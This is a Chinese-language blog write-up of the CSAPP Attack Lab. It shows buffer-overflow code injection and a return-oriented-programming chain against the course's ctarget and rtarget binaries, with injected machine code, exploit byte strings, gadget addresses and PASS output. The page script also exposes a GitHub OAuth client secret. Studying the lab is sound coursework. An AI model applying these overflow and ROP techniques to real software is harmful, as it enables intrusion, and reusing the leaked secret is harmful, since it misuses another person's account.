<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.2">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" integrity="sha256-DfWjNxDkM94fVBWx1H5BMMp0Zq7luBlV8QRcSES7s+0=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"mitmoksha.github.io","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.11.1","exturl":false,"sidebar":{"position":"left","display":"hide","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":true,"nav":null,"activeClass":"gitalk"},"stickytabs":false,"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="一个人几乎可以在任何他怀有无限热忱的事情上成功。">
<meta property="og:type" content="article">
<meta property="og:title" content="CSAPP: Attack Lab">
<meta property="og:url" content="https://mitmoksha.github.io/2022/06/15/CSAPP-Lab3-Attack-Lab/index.html">
<meta property="og:site_name" content="Moksha&#39;s Blog">
<meta property="og:description" content="一个人几乎可以在任何他怀有无限热忱的事情上成功。">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2022-06-15T03:47:48.000Z">
<meta property="article:modified_time" content="2022-07-01T14:53:03.205Z">
<meta property="article:author" content="Pishun Huang">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://mitmoksha.github.io/2022/06/15/CSAPP-Lab3-Attack-Lab/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://mitmoksha.github.io/2022/06/15/CSAPP-Lab3-Attack-Lab/","path":"2022/06/15/CSAPP-Lab3-Attack-Lab/","title":"CSAPP: Attack Lab"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>CSAPP: Attack Lab | Moksha's Blog</title>
  





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="Moksha's Blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Moksha's Blog</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-主页"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>主页</a></li><li class="menu-item menu-item-关于"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-目录"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>目录</a></li><li class="menu-item menu-item-归档"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#part-i-code-injection-attacks"><span class="nav-number">1.</span> <span class="nav-text">Part I: Code Injection Attacks</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#level-1"><span class="nav-number">1.1.</span> <span class="nav-text">Level 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-2"><span class="nav-number">1.2.</span> <span class="nav-text">Level 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-3"><span class="nav-number">1.3.</span> <span class="nav-text">Level 3</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#part-ii-return-oriented-programming"><span class="nav-number">2.</span> <span class="nav-text">Part II: Return-Oriented Programming</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Pishun Huang</p>
  <div class="site-description" itemprop="description">Opportunities are ready for it, the more to beat action.</div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">42</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">14</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
  </nav>
</div>



        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://mitmoksha.github.io/2022/06/15/CSAPP-Lab3-Attack-Lab/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Pishun Huang">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Moksha's Blog">
      <meta itemprop="description" content="Opportunities are ready for it, the more to beat action.">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="CSAPP: Attack Lab | Moksha's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          CSAPP: Attack Lab
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-06-15 11:47:48" itemprop="dateCreated datePublished" datetime="2022-06-15T11:47:48+08:00">2022-06-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-07-01 22:53:03" itemprop="dateModified" datetime="2022-07-01T22:53:03+08:00">2022-07-01</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CMU15-213/" itemprop="url" rel="index"><span itemprop="name">CMU15-213</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <blockquote>
<p>一个人几乎可以在任何他怀有无限热忱的事情上成功。 <span id="more"></span></p>
</blockquote>
<h2 id="part-i-code-injection-attacks">Part I: Code Injection Attacks</h2>
<h3 id="level-1">Level 1</h3>
<ul>
<li>要注意<strong>小端字节序</strong>在内存中的布局</li>
<li>若Gets函数返回值不为1则出现<code>segmentation fault</code></li>
<li>进入gdb进入buf函数之后，<code>info frame</code>查看栈帧信息。<code>getbuf</code>函数没有参数，局部变量的起始地址都为<code>0x5561dc70</code>，在开辟栈帧时先将返回地址(i.e.getbuf函数下一条指令的地址)压入栈中<code>0x5561dca0</code>处，再将栈顶指针<code>rsp</code>减少<code>0x28</code>到<code>0x5561dc78</code>。注意输入的<code>exploit string</code>的末尾会自动加上一个<code>null</code>(i.e.<code>\0000</code>)。还要注意<code>little endian</code>的问题(比如局部变量buf数组会将栈中连续地址的内容以<strong>字节</strong>按照小端字节序来排列，返回地址是指针值64-bit，8个字节按照小端字节序排列)。因为栈开辟的栈的大小为40个字节，一个字符为1字节。因此输入40个空字符(0x00)后，再紧跟着14个十六进制数(最后会自动补上一个00)表示返回地址(i.e.<code>touch1</code>的入口地址<code>0x4018c0</code>)，即<code>c0 18 40 00 00 00 00</code>。 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(gdb) info frame</span><br><span class="line">Stack level <span class="number">0</span>, frame at <span class="number">0x5561dca8</span>:                         ; level <span class="number">0</span>表示帧由高地址向低地址增长</span><br><span class="line"> rip = <span class="number">0x4017ac</span> in getbuf (buf.c:<span class="number">14</span>); saved rip = <span class="number">0x401976</span>  ; 返回地址<span class="number">0x401976</span></span><br><span class="line"> called by frame at <span class="number">0x5561dcb8</span>                              ; 调用者栈帧的地址</span><br><span class="line"> source language c.</span><br><span class="line"> Arglist at <span class="number">0x5561dc70</span>, args:</span><br><span class="line"> Locals at <span class="number">0x5561dc70</span>, Previous frame<span class="number">&#x27;</span>s sp is <span class="number">0x5561dca8</span>    ; 上一帧的栈指针指向的地址为<span class="number">0x5561dca8</span></span><br><span class="line"> Saved registers:</span><br><span class="line">  rip at <span class="number">0x5561dca0</span>                                         ; 返回地址被保存到<span class="number">0x5561dca0</span> </span><br></pre></td></tr></table></figure></li>
<li>紧接着输入<code>./ctarget &lt; exploit01-raw.txt -q</code>，phase1 passed! <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Cookie: <span class="number">0x59b997fa</span></span><br><span class="line">Type <span class="built_in">string</span>:Touch1!: You called <span class="title function_">touch1</span><span class="params">()</span></span><br><span class="line">Valid solution <span class="keyword">for</span> level 1 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 </span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="level-2">Level 2</h3>
<ul>
<li>附录B中提到了，可以先编写汇编代码，通过GCC进行编译汇编但不链接，产生obj文件。最后再将obj文件用<code>objdump</code>进行反汇编，将指令的<code>bytes code</code>提取出来，并通过<code>./hex2raw</code>生成带有C风格的注释</li>
<li>根据题目的意思，应该就是在<code>level 1</code>的基础上<code>getbuf</code>返回到一段自己的注入代码(在缓冲区中)，完成将cookie传递到rdi后再执行ret指令返回到<code>touch2</code>并传递一个参数来供<code>touch2</code>函数进行检查。所以我们先创建一个<code>example.s</code>文件然后通过GCC进行编译汇编但不进行链接，最后再使用<code>objdump</code>来反汇编代码得到<code>byte code</code>然后放到我们的<code>exploit string</code>中，进行攻击代码注入。</li>
<li>注意ret会将栈顶元素弹出并赋给PC(因此在从注入代码返回到<code>touch2</code>时需要执行<code>pushq</code>指令将<code>touch2</code>的地址压入栈中，再执行<code>ret</code>)。下面是攻击代码，这里我将它放到栈帧顶处<code>0x5561dc78</code>。因为栈帧顶为低地址，程序执行由低地址到高地址，我们将mov指令放到栈帧顶。试了一下好像只有<code>AT&amp;T</code>语法进行反汇编才能PASS(别忘了这是GCC、OBJDUMP和其他一些工具的默认格式)。这是进行反汇编后的代码： <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">example.o:</span>     file format elf64-x86-<span class="number">64</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of <span class="meta">section</span> .text:</span><br><span class="line"></span><br><span class="line"><span class="number">0000000000000000</span> &lt;.text&gt;:</span><br><span class="line">   <span class="number">0</span>:	<span class="number">48</span> c7 c7 fa <span class="number">97</span> b9 <span class="number">59</span> 	<span class="keyword">mov</span>    <span class="number">$0</span>x59b997fa,%rdi</span><br><span class="line">   <span class="number">7</span>:	<span class="number">68</span> ec <span class="number">17</span> <span class="number">40</span> <span class="number">00</span>       	pushq  <span class="number">$0</span>x4017ec</span><br><span class="line"><span class="symbol">   c:</span>	c3                   	retq   </span><br></pre></td></tr></table></figure></li>
<li>phase2 passed! <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Cookie: <span class="number">0x59b997fa</span></span><br><span class="line">Type <span class="built_in">string</span>:Touch2!: You called <span class="title function_">touch2</span><span class="params">(<span class="number">0x59b997fa</span>)</span></span><br><span class="line">Valid solution <span class="keyword">for</span> level 2 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="level-3">Level 3</h3>
<ul>
<li>应题目要求，先将cookie中的8个hex以ASCII字符的形式来表示，随后将这个字符串放入缓冲区中，再将它的起始地址放入rdi中作为touch3的第一个参数，其中调用的hexmatch会将cookie的hex形式与ASCII形式进行比较看输出是否正确，输入参数的过程需要代码注入</li>
<li>我的cookie为<code>0x59b997fa</code>转换为ASCII为<code>35 39 62 39 39 37 66 61</code>，别忘了以空字符<code>00</code>作为结尾，一共占用9个字节。因为<code>hexmatch</code>中<code>s</code>的位置是随机的有可能会覆盖掉getbuf中的缓冲区(实验手册说明的)，因此我们得把字符串的地址放在比较安全的地方，也就是调用<code>getbuf</code>之前，在<code>text</code>的栈帧中，于是我们选择放在<code>text</code>的栈帧顶<code>0x5561dca8</code>也就是getbuf缓冲区中第48个字节起始的位置。在level2的基础上，需要考虑<strong>缓冲区被随机覆盖</strong>的情况</li>
<li>反汇编后的代码: <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">example3.o:</span>     file format elf64-x86-<span class="number">64</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of <span class="meta">section</span> .text:</span><br><span class="line"></span><br><span class="line"><span class="number">0000000000000000</span> &lt;.text&gt;:</span><br><span class="line">   <span class="number">0</span>:	<span class="number">48</span> c7 c7 a8 dc <span class="number">61</span> <span class="number">55</span> 	<span class="keyword">mov</span>    <span class="number">$0</span>x5561dca8,%rdi</span><br><span class="line">   <span class="number">7</span>:	<span class="number">68</span> fa <span class="number">18</span> <span class="number">40</span> <span class="number">00</span>       	pushq  <span class="number">$0</span>x4018fa</span><br><span class="line"><span class="symbol">   c:</span>	c3                   	retq   </span><br></pre></td></tr></table></figure></li>
<li>提取指令的字节序列放入缓冲区中</li>
<li>phase3 passed!: <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Cookie: <span class="number">0x59b997fa</span></span><br><span class="line">Type <span class="built_in">string</span>:Touch3!: You called <span class="title function_">touch3</span><span class="params">(<span class="string">&quot;59b997fa&quot;</span>)</span></span><br><span class="line">Valid solution <span class="keyword">for</span> level 3 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 </span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="part-ii-return-oriented-programming">Part II: Return-Oriented Programming</h2>
<ul>
<li>RTARGET相比较于CTARGET用到了栈随机化的方式，因此很难决定注入代码的位置。以及因为可执行控制位的限制，在那一部分内存中执行注入代码会出现，<code>segmentation fault</code>的错误</li>
<li>ROP(return-oriented programming)，区分已经存在的字节序列，这些指令后面紧跟着ret指令。 ### Level 2</li>
<li>只能使用前八个寄存器(%rax~%rdi)；提示了当前所需的指令序列在start_farm到mid_farm之间；只能使用两个gadgets</li>
<li>建议中提示使用会使用到<code>pop</code>指令，可以将<code>cookie</code>放到test栈帧顶，然后通过pop指令将其送到指定的rdi寄存器中。但是很遗憾没有找到字节编码为<code>0x5f</code>的<code>pop %rdi</code>指令，然后想到可不可以将它pop到rax寄存器后再将它mov到rdi寄存器中呢?!答案是可以的</li>
<li>从farm中提取<code>movq %rdi, %rsi</code>指令，指令起始地址为<code>0x4019c5</code>: <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000004019</span>c3 &lt;setval_426&gt;:</span><br><span class="line">  <span class="number">4019</span>c3:	c7 <span class="number">07</span> <span class="number">48</span> <span class="number">89</span> c7 <span class="number">90</span>    	movl   $<span class="number">0x90c78948</span>,(%rdi)</span><br><span class="line">  <span class="number">4019</span>c9:	c3                   	retq   </span><br></pre></td></tr></table></figure></li>
<li>从farm中提取<code>popq %rdi</code>指令，指令起始地址为<code>0x4091ab</code>: <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000004019</span>a7 &lt;addval_219&gt;:</span><br><span class="line">  <span class="number">4019</span>a7:	<span class="number">8</span>d <span class="number">87</span> <span class="number">51</span> <span class="number">73</span> <span class="number">58</span> <span class="number">90</span>    	lea    <span class="number">-0x6fa78caf</span>(%rdi),%eax</span><br><span class="line">  <span class="number">4019</span>ad:	c3                   	retq  </span><br></pre></td></tr></table></figure></li>
<li>在返回地址处存放gadget0&lt;addval_219+4&gt;的入口地址，也就是getbuf栈帧执行结束返回的地址。getbuf执行结束后，将入口地址赋给PC，程序将跳转到addval_219+4处执行popq指令，将存储在test栈帧顶的cookie弹出，然后栈顶指针rsp向高地址移动8个bit，此时指向的是gadget1&lt;setval_426+2&gt;的入口地址。在gadget0执行结束时，执行ret，会将gadget1的地址弹出作为PC的跳转地址并将栈顶指针向高地址移动8个bit，随后跳转到gadget1执行。紧接着在连续的地址单元中存放的是touch2的入口地址，在gadget1返回后，已经将cookie放入到rdi寄存器中作为参数，执行ret后将存放在test栈帧中的入口地址弹出，跳转到touch2中执行，完成ROP！</li>
<li>注意ret弹的是64位的地址值。</li>
<li>这时候仔细想想，前面几个level是不是也能按照这样的思路完成呢？比如说在返回地址处也放一条pop指令，随后在test栈帧处注入攻击代码。</li>
<li>phase4 passed!: <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Cookie: <span class="number">0x59b997fa</span></span><br><span class="line">Type <span class="built_in">string</span>:Touch2!: You called <span class="title function_">touch2</span><span class="params">(<span class="number">0x59b997fa</span>)</span></span><br><span class="line">Valid solution <span class="keyword">for</span> level 2 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure> &gt; Option考上master之后再继续完成吧</li>
</ul>

    </div>

    
    
    

    <footer class="post-footer">

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2022/06/01/DLX-Lab/" rel="prev" title="DLX Lab">
                  <i class="fa fa-chevron-left"></i> DLX Lab
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2022/12/27/DB-Reading/" rel="next" title="DB_Reading">
                  DB_Reading <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






    <div class="comments gitalk-container"></div>
</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Pishun Huang</span>
</div>

<!--
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/mist/" rel="noopener" target="_blank">NexT.Mist</a>
  </div>-->

    </div>
  </footer>

  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  
<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>





  




  

  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","//mhchem.github.io/MathJax-mhchem/ mhchem":false,"js":{"url":"https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js","integrity":"sha256-r+3itOMtGGjap0x+10hu6jW/gZCzxHsoKrOd7gyRSGY="}}</script>
<script src="/js/third-party/math/mathjax.js"></script>


<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">

<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"MITMOKSHA","repo":"MITMOKSHA.github.io","client_id":"1bc801cf709af0ddca6a","client_secret":"10ac0f160a26730afadf94d39d045789894a180a","admin_user":"MITMOKSHA","distraction_free_mode":false,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":"zh-CN","js":{"url":"https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js","integrity":"sha256-Pmj85ojLaPOWwRtlMJwmezB/Qg8BzvJp5eTzvXaYAfA="},"path_md5":"be42547c1b691f802ccd36bb0cf735bb"}</script>
<script src="/js/third-party/comments/gitalk.js"></script>

</body>
</html>
